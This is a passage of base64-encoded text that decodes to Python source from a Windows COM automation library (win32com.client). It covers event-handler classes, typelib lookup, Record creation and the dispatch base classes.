uZXRFeHBsb3Jlci5BcHBsaWNhdGlvbiIpXG4gICAgPj4+IGllX2V2ZW50cyA9IFdpdGhFdmVudHMoaWUsIElFRXZlbnRzKVxuICAgID4+PiBpZS5WaXNpYmxlID0gMVxuICAgIFZpc2libGUgY2hhbmdlZDogMVxuXG4gICAgQ29tcGFyZSB3aXRoIHRoZSBjb2RlIHNhbXBsZSBmb3IgRGlzcGF0Y2hXaXRoRXZlbnRzLCB3aGVyZSB5b3UgZ2V0IGFcbiAgICBzaW5nbGUgb2JqZWN0IHRoYXQgaXMgYm90aCB0aGUgaW50ZXJmYWNlIGFuZCB0aGUgZXZlbnQgaGFuZGxlci4gIE5vdGUgdGhhdFxuICAgIHRoZSBldmVudCBoYW5kbGVyIGluc3RhbmNlIHdpbGwgKm5vdCogYmUgYWJsZSB0byB1c2UgXCdzZWxmLlwnIHRvIHJlZmVyIHRvXG4gICAgSUVcJ3MgbWV0aG9kcyBhbmQgcHJvcGVydGllcy5cblxuICAgIFRoaXMgaXMgbWFpbmx5IHVzZWZ1bCB3aGVyZSB1c2luZyBEaXNwYXRjaFdpdGhFdmVudHMgY2F1c2VzXG4gICAgY2lyY3VsYXIgcmVmZXJlbmNlIHByb2JsZW1zIHRoYXQgdGhlIHNpbXBsZSBwcm94eSBkb2VzblwndCBkZWFsIHdpdGhcbiAgICAiIiJcbiAgICBkaXNwID0gRGlzcGF0Y2goZGlzcClcbiAgICBpZiBub3QgZGlzcC5fX2NsYXNzX18uX19kaWN0X18uZ2V0KFxuICAgICAgICAiQ0xTSUQiXG4gICAgKTogICMgRWVlayAtIG5vIG1ha2VweSBzdXBwb3J0IC0gdHJ5IGFuZCBidWlsZCBpdC5cbiAgICAgICAgdHJ5OlxuICAgICAgICAgICAgdGkgPSBkaXNwLl9vbGVvYmpfLkdldFR5cGVJbmZvKClcbiAgICAgICAgICAgIGRpc3BfY2xzaWQgPSB0aS5HZXRUeXBlQXR0cigpWzBdXG4gICAgICAgICAgICB0bGIsIGluZGV4ID0gdGkuR2V0Q29udGFpbmluZ1R5cGVMaWIoKVxuICAgICAgICAgICAgdGxhID0gdGxiLkdldExpYkF0dHIoKVxuICAgICAgICAgICAgZ2VuY2FjaGUuRW5zdXJlTW9kdWxlKHRsYVswXSwgdGxhWzFdLCB0bGFbM10sIHRsYVs0XSwgYlZhbGlkYXRlRmlsZT0wKVxuICAgICAgICAgICAgIyBHZXQgdGhlIGNsYXNzIGZyb20gdGhlIG1vZHVsZS5cbiAgICAgICAgICAgIGRpc3BfY2xhc3MgPSBnZW5jYWNoZS5HZXRDbGFzc0ZvclByb2dJRChzdHIoZGlzcF9jbHNpZCkpXG4gICAgICAgIGV4Y2VwdCBweXRob25jb20uY29tX2Vycm9yOlxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxuICAgICAgICAgICAgICAgICJUaGlzIENPTSBvYmplY3QgY2FuIG5vdCBhdXRvbWF0ZSB0aGUgbWFrZXB5IHByb2Nlc3MgLSBwbGVhc2UgcnVuIG1ha2VweSBtYW51YWxseSBmb3IgdGhpcyBvYmplY3QiXG4gICAgICAgICAgICApXG4gICAgZWxzZTpcbiAgICAgICAgZGlzcF9jbGFzcyA9IGRpc3AuX19jbGFzc19fXG4gICAgIyBHZXQgdGhlIGNsc2lkXG4gICAgY2xzaWQgPSBkaXNwX2NsYXNzLkNMU0lEXG4gICAgIyBDcmVhdGUgYSBuZXcgY2xhc3MgdGhhdCBkZXJpdmVzIGZyb20gMiBjbGFzc2VzIC0gdGhlIGV2ZW50IHNpbmtcbiAgICAjIGNsYXNzIGFuZCB0aGUgdXNlciBjbGFzcy5cbiAgICB0cnk6XG4gICAgICAgIGZyb20gdHlwZXMgaW1wb3J0IENsYXNzVHlwZSBhcyBuZXdfdHlwZVxuICAgIGV4Y2VwdCBJbXBvcnRFcnJvcjpcbiAgICAgICAgbmV3X3R5cGUgPSB0eXBlICAjIHB5M2tcbiAgICBldmVudHNfY2xhc3MgPSBnZXRldmVudHMoY2xzaWQpXG4gICAgaWYgZXZlbnRzX2NsYXNzIGlzIE5vbmU6XG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIlRoaXMgQ09NIG9iamVjdCBkb2VzIG5vdCBzdXBwb3J0IGV2ZW50cy4iKVxuICAgIHJlc3VsdF9jbGFzcyA9IG5ld190eXBlKCJDT01FdmVudENsYXNzIiwgKGV2ZW50c19jbGFzcywgdXNlcl9ldmVudF9jbGFzcyksIHt9KVxuICAgIGluc3RhbmNlID0gcmVzdWx0X2NsYXNzKGRpc3ApICAjIFRoaXMgb25seSBjYWxscyB0aGUgZmlyc3QgYmFzZSBjbGFzcyBfX2luaXRfXy5cbiAgICBpZiBoYXNhdHRyKHVzZXJfZXZlbnRfY2xhc3MsICJfX2luaXRfXyIpOlxuICAgICAgICB1c2VyX2V2ZW50X2NsYXNzLl9faW5pdF9fKGluc3RhbmNlKVxuICAgIHJldHVybiBpbnN0YW5jZVxuXG5cbmRlZiBnZXRldmVudHMoY2xzaWQpOlxuICAgICIiIkRldGVybWluZSB0aGUgZGVmYXVsdCBvdXRnb2luZyBpbnRlcmZhY2UgZm9yIGEgY2xhc3MsIGdpdmVuXG4gICAgZWl0aGVyIGEgY2xzaWQgb3IgcHJvZ2lkLiBJdCByZXR1cm5zIGEgY2xhc3MgLSB5b3UgY2FuXG4gICAgY29udmVuaWVudGx5IGRlcml2ZSB5b3VyIG93biBoYW5kbGVyIGZyb20gdGhpcyBjbGFzcyBhbmQgaW1wbGVtZW50XG4gICAgdGhlIGFwcHJvcHJpYXRlIG1ldGhvZHMuXG5cbiAgICBUaGlzIG1ldGhvZCByZWxpZXMgb24gdGhlIGNsYXNzZXMgcHJvZHVjZWQgYnkgbWFrZXB5LiBZb3UgbXVzdCB1c2VcbiAgICBlaXRoZXIgbWFrZXB5IG9yIHRoZSBnZW5jYWNoZSBtb2R1bGUgdG8gZW5zdXJlIHRoYXQgdGhlXG4gICAgYXBwcm9wcmlhdGUgc3VwcG9ydCBjbGFzc2VzIGhhdmUgYmVlbiBnZW5lcmF0ZWQgZm9yIHRoZSBjb20gc2VydmVyXG4gICAgdGhhdCB5b3Ugd2lsbCBiZSBoYW5kbGluZyBldmVudHMgZnJvbS5cblxuICAgIEJld2FyZSBvZiBDT00gY2lyY3VsYXIgcmVmZXJlbmNlcy4gIFdoZW4gdGhlIEV2ZW50cyBjbGFzcyBpcyBjb25uZWN0ZWRcbiAgICB0byB0aGUgQ09NIG9iamVjdCwgdGhlIENPTSBvYmplY3QgaXRzZWxmIGtlZXBzIGEgcmVmZXJlbmNlIHRvIHRoZSBQeXRob25cbiAgICBldmVudHMgY2xhc3MuICBUaHVzLCBuZWl0aGVyIHRoZSBFdmVudHMgaW5zdGFuY2Ugb3IgdGhlIENPTSBvYmplY3Qgd2lsbFxuICAgIGV2ZXIgZGllIGJ5IHRoZW1zZWx2ZXMuICBUaGUgXCdjbG9zZVwnIG1ldGhvZCBvbiB0aGUgZXZlbnRzIGluc3RhbmNlXG4gICAgbXVzdCBiZSBjYWxsZWQgdG8gYnJlYWsgdGhpcyBjaGFpbiBhbmQgYWxsb3cgc3RhbmRhcmQgUHl0aG9uIGNvbGxlY3Rpb25cbiAgICBydWxlcyB0byBtYW5hZ2Ugb2JqZWN0IGxpZmV0aW1lcy4gIE5vdGUgdGhhdCBEaXNwYXRjaFdpdGhFdmVudHMoKSBkb2VzXG4gICAgd29yayBhcm91bmQgdGhpcyBwcm9ibGVtIGJ5IHRoZSB1c2Ugb2YgYSBwcm94eSBvYmplY3QsIGJ1dCBpZiB5b3UgdXNlXG4gICAgdGhlIGdldGV2ZW50cygpIGZ1bmN0aW9uIHlvdXJzZWxmLCB5b3UgbXVzdCBtYWtlIHlvdXIgb3duIGFycmFuZ2VtZW50c1xuICAgIHRvIG1hbmFnZSB0aGlzIGNpcmN1bGFyIHJlZmVyZW5jZSBpc3N1ZS5cblxuICAgIEJld2FyZSBvZiBjcmVhdGluZyBQeXRob24gY2lyY3VsYXIgcmVmZXJlbmNlczogdGhpcyB3aWxsIGhhcHBlbiBpZiB5b3VyXG4gICAgaGFuZGxlciBoYXMgYSByZWZlcmVuY2UgdG8gYW4gb2JqZWN0IHRoYXQgaGFzIGEgcmVmZXJlbmNlIGJhY2sgdG9cbiAgICB0aGUgZXZlbnQgc291cmNlLiBDYWxsIHRoZSBcJ2Nsb3NlXCcgbWV0aG9kIHRvIGJyZWFrIHRoZSBjaGFpbi5cblxuICAgIEV4YW1wbGU6XG5cbiAgICA+Pj53aW4zMmNvbS5jbGllbnQuZ2VuY2FjaGUuRW5zdXJlTW9kdWxlKFwne0VBQjIyQUMwLTMwQzEtMTFDRi1BN0VCLTAwMDBDMDVCQUUwQn1cJywwLDEsMSlcbiAgICA8bW9kdWxlIFwnd2luMzJjb20uZ2VuX3B5Li4uLi5cbiAgICA+Pj5cbiAgICA+Pj4gY2xhc3MgSW50ZXJuZXRFeHBsb3JlckV2ZW50cyh3aW4zMmNvbS5jbGllbnQuZ2V0ZXZlbnRzKCJJbnRlcm5ldEV4cGxvcmVyLkFwcGxpY2F0aW9uLjEiKSk6XG4gICAgLi4uICAgIGRlZiBPblZpc2libGUoc2VsZiwgVmlzaWJsZSk6XG4gICAgLi4uICAgICAgICBwcmludCAiVmlzaWJpbGl0eSBjaGFuZ2VkOiAiLCBWaXNpYmxlXG4gICAgLi4uXG4gICAgPj4+XG4gICAgPj4+IGllPXdpbjMyY29tLmNsaWVudC5EaXNwYXRjaCgiSW50ZXJuZXRFeHBsb3Jlci5BcHBsaWNhdGlvbi4xIilcbiAgICA+Pj4gZXZlbnRzPUludGVybmV0RXhwbG9yZXJFdmVudHMoaWUpXG4gICAgPj4+IGllLlZpc2libGU9MVxuICAgIFZpc2liaWxpdHkgY2hhbmdlZDogIDFcbiAgICA+Pj5cbiAgICAiIiJcblxuICAgICMgZmluZCBjbHNpZCBnaXZlbiBwcm9naWQgb3IgY2xzaWRcbiAgICBjbHNpZCA9IHN0cihweXdpbnR5cGVzLklJRChjbHNpZCkpXG4gICAgIyByZXR1cm4gZGVmYXVsdCBvdXRnb2luZyBpbnRlcmZhY2UgZm9yIHRoYXQgY2xhc3NcbiAgICBrbGFzcyA9IGdlbmNhY2hlLkdldENsYXNzRm9yQ0xTSUQoY2xzaWQpXG4gICAgdHJ5OlxuICAgICAgICByZXR1cm4ga2xhc3MuZGVmYXVsdF9zb3VyY2VcbiAgICBleGNlcHQgQXR0cmlidXRlRXJyb3I6XG4gICAgICAgICMgU2VlIGlmIHdlIGhhdmUgYSBjb2NsYXNzIGZvciB0aGUgaW50ZXJmYWNlcy5cbiAgICAgICAgdHJ5OlxuICAgICAgICAgICAgcmV0dXJuIGdlbmNhY2hlLkdldENsYXNzRm9yQ0xTSUQoa2xhc3MuY29jbGFzc19jbHNpZCkuZGVmYXVsdF9zb3VyY2VcbiAgICAgICAgZXhjZXB0IEF0dHJpYnV0ZUVycm9yOlxuICAgICAgICAgICAgcmV0dXJuIE5vbmVcblxuXG4jIEEgUmVjb3JkIG9iamVjdCwgYXMgdXNlZCBieSB0aGUgQ09NIHN0cnVjdCBzdXBwb3J0XG5kZWYgUmVjb3JkKG5hbWUsIG9iamVjdCk6XG4gICAgIiIiQ3JlYXRlcyBhIG5ldyByZWNvcmQgb2JqZWN0LCBnaXZlbiB0aGUgbmFtZSBvZiB0aGUgcmVjb3JkLFxuICAgIGFuZCBhbiBvYmplY3QgZnJvbSB0aGUgc2FtZSB0eXBlIGxpYnJhcnkuXG5cbiAgICBFeGFtcGxlIHVzYWdlIHdvdWxkIGJlOlxuICAgICAgYXBwID0gd2luMzJjb20uY2xpZW50LkRpc3BhdGNoKCJTb21lLkFwcGxpY2F0aW9uIilcbiAgICAgIHBvaW50ID0gd2luMzJjb20uY2xpZW50LlJlY29yZCgiU29tZUFwcFBvaW50IiwgYXBwKVxuICAgICAgcG9pbnQueCA9IDBcbiAgICAgIHBvaW50LnkgPSAwXG4gICAgICBhcHAuTW92ZVRvKHBvaW50KVxuICAgICIiIlxuICAgICMgWFhYIC0gdG8gZG8gLSBwcm9iYWJseSBzaG91bGQgYWxsb3cgIm9iamVjdCIgdG8gYWxyZWFkeSBiZSBhIG1vZHVsZSBvYmplY3QuXG4gICAgZnJvbSAuIGltcG9ydCBnZW5jYWNoZVxuXG4gICAgb2JqZWN0ID0gZ2VuY2FjaGUuRW5zdXJlRGlzcGF0Y2gob2JqZWN0KVxuICAgIG1vZHVsZSA9IHN5cy5tb2R1bGVzW29iamVjdC5fX2NsYXNzX18uX19tb2R1bGVfX11cbiAgICAjIHRvIGFsbG93IHVzIHRvIHdvcmsgY29ycmVjdGx5IHdpdGggImRlbWFuZCBnZW5lcmF0ZWQiIGNvZGUsXG4gICAgIyB3ZSBtdXN0IHVzZSB0aGUgdHlwZWxpYiBDTFNJRCB0byBvYnRhaW4gdGhlIG1vZHVsZVxuICAgICMgKG90aGVyd2lzZSB3ZSBnZXQgdGhlIHN1Yi1tb2R1bGUgZm9yIHRoZSBvYmplY3QsIHdoaWNoXG4gICAgIyBkb2VzIG5vdCBob2xkIHRoZSByZWNvcmRzKVxuICAgICMgdGh1cywgcGFja2FnZSBtYXkgYmUgbW9kdWxlLCBvciBtYXkgYmUgbW9kdWxlXCdzIHBhcmVudCBpZiBkZW1hbmQgZ2VuZXJhdGVkLlxuICAgIHBhY2thZ2UgPSBnZW5jYWNoZS5HZXRNb2R1bGVGb3JUeXBlbGliKFxuICAgICAgICBtb2R1bGUuQ0xTSUQsIG1vZHVsZS5MQ0lELCBtb2R1bGUuTWFqb3JWZXJzaW9uLCBtb2R1bGUuTWlub3JWZXJzaW9uXG4gICAgKVxuICAgIHRyeTpcbiAgICAgICAgc3RydWN0X2d1aWQgPSBwYWNrYWdlLlJlY29yZE1hcFtuYW1lXVxuICAgIGV4Y2VwdCBLZXlFcnJvcjpcbiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcbiAgICAgICAgICAgICJUaGUgc3RydWN0dXJlIFwnJXNcJyBpcyBub3QgZGVmaW5lZCBpbiBtb2R1bGUgXCclc1wnIiAlIChuYW1lLCBwYWNrYWdlKVxuICAgICAgICApXG4gICAgcmV0dXJuIHB5dGhvbmNvbS5HZXRSZWNvcmRGcm9tR3VpZHMoXG4gICAgICAgIG1vZHVsZS5DTFNJRCwgbW9kdWxlLk1ham9yVmVyc2lvbiwgbW9kdWxlLk1pbm9yVmVyc2lvbiwgbW9kdWxlLkxDSUQsIHN0cnVjdF9ndWlkXG4gICAgKVxuXG5cbiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4jIFRoZSBiYXNlIG9mIGFsbCBtYWtlcHkgZ2VuZXJhdGVkIGNsYXNzZXNcbiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG5jbGFzcyBEaXNwYXRjaEJhc2VDbGFzczpcbiAgICBkZWYgX19pbml0X18oc2VsZiwgb29iaj1Ob25lKTpcbiAgICAgICAgaWYgb29iaiBpcyBOb25lOlxuICAgICAgICAgICAgb29iaiA9IHB5dGhvbmNvbS5uZXcoc2VsZi5DTFNJRClcbiAgICAgICAgZWxpZiBpc2luc3RhbmNlKG9vYmosIERpc3BhdGNoQmFzZUNsYXNzKTpcbiAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICBvb2JqID0gb29iai5fb2xlb2JqXy5RdWVyeUludGVyZmFjZShcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5DTFNJRCwgcHl0aG9uY29tLklJRF9JRGlzcGF0Y2hcbiAgICAgICAgICAgICAgICApICAjIE11c3QgYmUgYSB2YWxpZCBDT00gaW5zdGFuY2VcbiAgICAgICAgICAgIGV4Y2VwdCBweXRob25jb20uY29tX2Vycm9yIGFzIGRldGFpbHM6XG4gICAgICAgICAgICAgICAgaW1wb3J0IHdpbmVycm9yXG5cbiAgICAgICAgICAgICAgICAjIFNvbWUgc3R1cGlkIG9iamVjdHMgZmFpbCBoZXJlLCBldmVuIHRobyBpdCBpcyBfYWxyZWFkeV8gSURpc3BhdGNoISE/P1xuICAgICAgICAgICAgICAgICMgRWcsIExvdHVzIG5vdGVzLlxuICAgICAgICAgICAgICAgICMgU28ganVzdCBsZXQgaXQgdXNlIHRoZSBleGlzdGluZyBvYmplY3QgaWYgRV9OT0lOVEVSRkFDRVxuICAgICAgICAgICAgICAgIGlmIGRldGFpbHMuaHJlc3VsdCAhPSB3aW5lcnJvci5FX05PSU5URVJGQUNFOlxuICAgICAgICAgICAgICAgICAgICByYWlzZVxuICAgICAgICAgICAgICAgIG9vYmogPSBvb2JqLl9vbGVvYmpfXG4gICAgICAgIHNlbGYuX19kaWN0X19bIl9vbGVvYmpfIl0gPSBvb2JqICAjIHNvIHdlIGRvbnQgY2FsbCBfX3NldGF0dHJfX1xuXG4gICAgZGVmIF9fZGlyX18oc2VsZik6XG4gICAgICAgIGxzdCA9IChcbiAgICAgICAgICAgIGxpc3Qoc2VsZi5fX2RpY3RfXy5rZXlzKCkpXG4gICAgICAgICAgICArIGRpcihzZWxmLl9fY2xhc3NfXylcbiAgICAgICAgICAgICsgbGlzdChzZWxmLl9wcm9wX21hcF9nZXRfLmtleXMoKSlcbiAgICAgICAgICAgICsgbGlzdChzZWxmLl9wcm9wX21hcF9wdXRfLmtleXMoKSlcbiAgICAgICAgKVxuICAgICAgICB0cnk6XG4gICAgICAgICAgICBsc3QgKz0gW3AuTmFtZSBmb3IgcCBpbiBzZWxmLlByb3BlcnRpZXNfXVxuICAgICAgICBleGNlcHQgQXR0cmlidXRlRXJyb3I6XG4gICAgICAgICAgICBwYXNzXG4gICAgICAgIHJldHVybiBsaXN0KHNldChsc3QpKVxuXG4gICAgIyBQcm92aWRlIGEgcHJldHRpZXIgbmFtZSB0aGFuIHRoZSBDTFNJRFxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKTpcbiAgICAgICAgIyBOZWVkIHRvIGdldCB0aGUgZG9jc3RyaW5nIGZvciB0aGUgbW9kdWxlIGZvciB0aGlzIGNsYXNzLlxuICAgICAgICB0cnk6XG4gICAgICAgICAgICBtb2RfZG9jID0gc3lzLm1vZHVsZXNbc2VsZi5fX2NsYXNzX18uX19tb2R1bGVfX10uX19kb2NfX1xuICAgICAgICAgICAgaWYgbW9kX2RvYzpcbiAgICAgICAgICAgICAgICBtb2RfbmFtZSA9ICJ3aW4zMmNvbS5nZW5fcHkuIiArIG1vZF9kb2NcbiAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgbW9kX25hbWUgPSBzeXMubW9kdWxlc1tzZWxmLl9fY2xhc3NfXy5fX21vZHVsZV9fXS5fX25hbWVfX1xuICAgICAgICBleGNlcHQgS2V5RXJyb3I6XG4gICAgICAgICAgICBtb2RfbmFtZSA9ICJ3aW4zMmNvbS5nZW5fcHkudW5rbm93biJcbiAgICAgICAgcmV0dXJuICI8JXMuJXMgaW5zdGFuY2UgYXQgMHglcz4iICUgKFxuICAgICAgICAgICAgbW9kX25hbWUsXG4gICAgICAgICAgICBzZWxmLl9fY2xhc3NfXy5fX25hbWVfXyxcbiAgICAgICAgICAgIGlkKHNlbGYpLFxuICAgICAgICApXG5cbiAgICAjIERlbGVnYXRlIGNvbXBhcmlzb24gdG8gdGhlIG9sZW9ianMsIGFzIHRoZXkga25vdyBob3cgdG8gZG8gaWRlbnRpdHkuXG4gICAgZGVmIF9fZXFfXyhzZWxmLCBvdGhlcik6XG4gICAgICAgIG90aGVyID0gZ2V0YXR0cihvdGhlciwgIl9vbGVvYmpfIiwgb3RoZXIpXG4gICAgICAgIHJldHVybiBzZWxmLl9vbGVvYmpfID09IG90aGVyXG5cbiAgICBkZWYgX19uZV9fKHNlbGYsIG90aGVyKTpcbiAgICAgICAgb3RoZXIgPSBnZXRhdHRyKG90aGVyLCAiX29sZW9ial8iLCBvdGhlcilcbiAgICAgICAgcmV0dXJuIHNlbGYuX29sZW9ial8gIT0gb3RoZXJcblxuICAgIGRlZiBfQXBwbHlUeXBlc18oc2VsZiwgZGlzcGlkLCB3RmxhZ3MsIHJldFR5cGUsIGFyZ1R5cGVzLCB1c2VyLCByZXN1bHRDTFNJRCwgKmFyZ3MpOlxuICAgICAgICByZXR1cm4gc2VsZi5fZ2V0X2dvb2Rfb2JqZWN0XyhcbiAgICAgICAgICAgIHNlbGYuX29sZW9ial8uSW52b2tlVHlwZXMoZGlzcGlkLCAwLCB3RmxhZ3MsIHJldFR5cGUsIGFyZ1R5cGVzLCAqYXJncyksXG4gICAgICAgICAgICB1c2VyLFxuICAgICAgICAgICAgcmVzdWx0Q0xTSUQsXG4gICAgICAgIClcblxuICAgIGRlZiBfX2dldGF0dHJfXyhzZWxmLCBhdHRyKTpcbiAgICAgICAgYXJncyA9IHNlbGYuX3Byb3BfbWFwX2dldF8uZ2V0KGF0dHIpXG4gICAgICAgIGlmIGFyZ3MgaXMgTm9uZTpcbiAgICAgICAgICAgIHJhaXNlIEF0dHJpYnV0ZUVycm9yKFxuICAgICAgICAgICAgICAgICJcJyVzXCcgb2JqZWN0IGhhcyBubyBhdHRyaWJ1dGUgXCclc1wnIiAlIChyZXByKHNlbGYpLCBhdHRyKVxuICAgICAgICAgICAgKVxuICAgICAgICByZXR1cm4gc2VsZi5fQXBwbHlUeXBlc18oKmFyZ3MpXG5cbiAgICBkZWYgX19zZXRhdHRyX18oc2VsZiwgYXR0ciwgdmFsdWUpOlxuICAgICAgICBpZiBhdHRyIGluIHNlbGYuX19kaWN0X186XG4gICAgICAgICAgICBzZWxmLl9fZGljdF9fW2F0dHJdID0gdmFsdWVcbiAgICAgICAgICAgIHJldHVyblxuICAgICAgICB0cnk6XG4gICAgICAgICAgICBhcmdzLCBkZWZBcmdzID0gc2VsZi5fcHJvcF9tYXBfcHV0X1thdHRyXVxuICAgICAgICBleGNlcHQgS2V5RXJyb3I6XG4gICAgICAgICAgICByYWlzZSBBdHRyaWJ1dGVFcnJvcihcbiAgICAgICAgICAgICAgICAiXCclc1wnIG9iamVjdCBoYXMgbm8gYXR0cmlidXRlIFwnJXNcJyIgJSAocmVwcihzZWxmKSwgYXR0cilcbiAgICAgICAgICAgIClcbiAgICAgICAgc2VsZi5fb2xlb2JqXy5JbnZva2UoKihhcmdzICsgKHZhbHVlLCkgKyBkZWZBcmdzKSlcblxuICAgIGRlZiBfZ2V0X2dvb2Rfc2luZ2xlX29iamVjdF8oc2VsZiwgb2JqLCBvYlVzZXJOYW1lPU5vbmUsIHJlc3VsdENMU0lEPU5vbmUpOlxuICAgICAgICByZXR1cm4gX2dldF9nb29kX3NpbmdsZV9vYmplY3RfKG9iaiwgb2JVc2VyTmFtZSwgcmVzdWx0Q0xTSUQpXG5cbiAgICBkZWYgX2dldF9nb29kX29iamVjdF8oc2VsZiwgb2JqLCBvYlVzZXJOYW1lPU5vbmUsIHJlc3VsdENMU0lEPU5vbmUpOlxuICAgICAgICByZXR1cm4gX2dldF9nb29kX29iamVjdF8ob2JqLCBvYlVzZXJOYW1lLCByZXN1bHRDTFNJRClcblxuXG4jIFhYWCAtIFRoZXNlIHNob3VsZCBiZSBjb25zb2xpZGF0ZWQgd2l0aCBkeW5hbWljLnB5IHZlcnNpb25zLlxuZGVmIF9nZXRfZ29vZF9zaW5nbGVfb2JqZWN0XyhvYmosIG9iVXNlck5hbWU9Tm9uZSwgcmVzdWx0Q0xTSUQ9Tm9uZSk6XG4gICAgaWYgX1B5SURpc3BhdGNoVHlwZSA9PSB0eXBlKG9iaik6XG4gICAgICAgIHJldHVybiBEaXNwYXRjaChvYmosIG9iVXNlck5hbWUsIHJlc3VsdENMU0lEKVxuICAgIHJldHVybiBvYmpcblxuXG5kZWYgX2dldF9nb29kX29iamVjdF8ob2JqLCBvYlVzZXJOYW1lPU5vbmUsIHJlc3VsdENMU0lEPU5vbmUpOlxuICAgIGlmIG9iaiBpcyBOb25lOlxuICAgICAgICByZXR1cm4gTm9uZVxuICAgIGVsaWYgaXNpbnN0YW5jZShvYmosIHR1cGxlKTpcbiAgICAgICAgb2JVc2VyTmFtZVR1cGxlID0gKG9iVXNlck5hbWUsKSAqIGxlbihvYmopXG4gICAgICAgIHJlc3VsdENMU0lEVHVwbGUgPSAocmVzdWx0Q0xTSUQsKSAqIGxlbihvYmopXG4gICAgICAgIHJldHVybiB0dXBsZShtYXAoX2dldF9nb29kX29iamVjdF8sIG9iaiwgb2JVc2VyTmFtZVR1cGxlLCByZXN1bHRDTFNJRFR1cGxlKSlcbiAgICBlbHNlOlxuICAgICAgICByZXR1cm4gX2dldF9nb29kX3NpbmdsZV9vYmplY3RfKG9iaiwgb2JVc2VyTmFtZSwgcmVzdWx0Q0xTSUQpXG5cblxuY2xhc3MgQ29DbGFzc0Jhc2VDbGFzczpcbiAgICBkZWYgX19pbml0X18oc2VsZiwgb29iaj1Ob25lKTpcbiAgICAgICAgaWYgb29iaiBpcyBOb25lOlxuICAgICAgICAgICAgb29iaiA9IHB5dGhvbmNvbS5uZXcoc2VsZi5DTFNJRClcbiAgICAgICAgZGlzcG9iaiA9IHNlbGYuX19kaWN0X19bIl9kaXNwb2JqXyJdID0gc2VsZi5kZWZhdWx0X2ludGVyZmFjZShvb2JqKVxuICAgICAgICAjIFNlZSBjb21tZW50cyBiZWxvdyByZSB0aGUgc3BlY2lhbCBtZXRob2RzLlxuICAgICAgICBmb3IgbWF5YmUgaW4gW1xuICAgICAgICAgICAgIl9fY2FsbF9fIixcbiAgICAgICAgICAgICJfX3N0cl9fIixcbiAgICAgICAgICAgICJfX2ludF9fIixcbiAgICAgICAgICAgICJfX2l0ZXJfXyIsXG4gICAgICAgICAgICAiX19sZW5fXyIsXG4gICAgICAgICAgICAiX19ub256ZXJvX18iLFxuICAgICAgICBdOlxuICAgICAgICAgICAgaWYgaGFzYXR0cihkaXNwb2JqLCBtYXliZSk6XG4gICAgICAgICAgICAgICAgc2V0YXR0cihzZWxmLCBtYXliZSwgZ2V0YXR0cihzZWxmLCAiX19tYXliZSIgKyBtYXliZSkpXG5cbiAgICBkZWYgX19yZXByX18oc2VsZik6XG4gICAgICAgIHJldHVybiAiPHdpbjMyY29tLmdlbl9weS4lcy4lcz4iICUgKF9fZG9jX18sIHNlbGYuX19jbGFzc19fLl9fbmFtZV9fKVxuXG4gICAgZGVmIF9fZ2V0YXR0cl9fKHNlbGYsIGF0dHIpOlxuICAgICAgICBkID0gc2VsZi5fX2RpY3RfX1siX2Rpc3BvYmpfIl1cbiAgICAgICAgaWYgZCBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgIHJldHVybiBnZXRhdHRyKGQsIGF0dHIpXG4gICAgICAgIHJhaXNlIEF0dHJpYnV0ZUVycm9yKGF0dHIpXG5cbiAgICBkZWYgX19zZXRhdHRyX18oc2VsZiwgYXR0ciwgdmFsdWUpOlxuICAgICAgICBpZiBhdHRyIGluIHNlbGYuX19kaWN0X186XG4gICAgICAgICAgICBzZWxmLl9fZGljdF9fW2F0dHJdID0gdmFsdWVcbiAgICAgICAgICAgIHJldHVyblxuICAgICAgICB0cnk6XG4gICAgICAgICAgICBkID0gc2VsZi5fX2RpY3RfX1siX2Rpc3BvYmpfIl1cbiAgICAgICAgICAgIGlmIGQgaXMgbm90IE5vbmU6XG4gICAgICAgICAgICAgICAgZC5fX3NldGF0dHJfXyhhdHRyLCB2YWx1ZSlcbiAgICAgICAgICAgICAgICByZXR1cm5cbiAgICAgICAgZXhjZXB0IEF0dHJpYnV0ZUVycm9yOlxuICAgICAgICAgICAgcGFzc1xuICAgICAgICBzZWxmLl9fZGljdF9fW2F0dHJdID0gdmFsdWVcblxuICAgICAgICAjIFNwZWNpYWwgbWV0aG9kcyBkb25cJ3QgdXNlIF9fZ2V0YXR0cl9fIGV0Yywgc28gZXhwbGljaXRseSBkZWxlZ2F0ZSBoZXJlLlxuICAgICAgICAjIE5vdGUgaG93ZXZlciwgdGhhdCBub3QgYWxsIGFyZSBzYWZlIHRvIGxldCBidWJibGUgdXAgLSB0aGluZ3MgbGlrZVxuICAgICAgICAjIGBib29sKG9iKWAgd2lsbCBicmVhayBpZiB0aGUgb2JqZWN0IGRlZmluZXMgX19pbnRfXyBidXQgdGhlbiByYWlzZXMgYW5cbiAgICAgICAgIyBhdHRyaWJ1dGUgZXJyb3IgLSBlZywgc2VlICMxNzUzLlxuICAgICAgICAjIEl0IGRlcGVuZHMgb24gd2hhdCB0aGUgd3JhcHBlZCBDT00gb2JqZWN0IGFjdHVhbGx5IGRlZmluZXMgd2hldGhlciB0aGVzZVxuICAgICAgICAjIHdpbGwgZXhpc3Qgb24gdGhlIHVuZGVybHlpbmcgb2JqZWN0LCBzbyBfX2luaXRfXyBleHBsaWNpdGx5IGNoZWNrcyBpZiB0aGV5XG4gICAgICAgICMgZG8gYW5kIGlmIHNvLCB3aXJlcyB0aGVtIHVwLlxuXG4gICAgZGVmIF9fbWF5YmVfX2NhbGxfXyhzZWxmLCAqYXJncywgKiprd2FyZ3MpOlxuICAgICAgICByZXR1cm4gc2VsZi5fX2RpY3RfX1siX2Rpc3BvYmpfIl0uX19jYWxsX18oKmFyZ3MsICoqa3dhcmdzKVxuXG4gICAgZGVmIF9fbWF5YmVfX3N0cl9fKHNlbGYsICphcmdzKTpcbiAgICAgICAgcmV0dXJuIHNlbGYuX19kaWN0X19bIl9kaXNwb2JqXyJdLl9fc3RyX18oKmFyZ3MpXG5cbiAgICBkZWYgX19tYXliZV9faW50X18oc2VsZiwgKmFyZ3MpOlxuICAgICAgICByZXR1cm4gc2VsZi5fX2R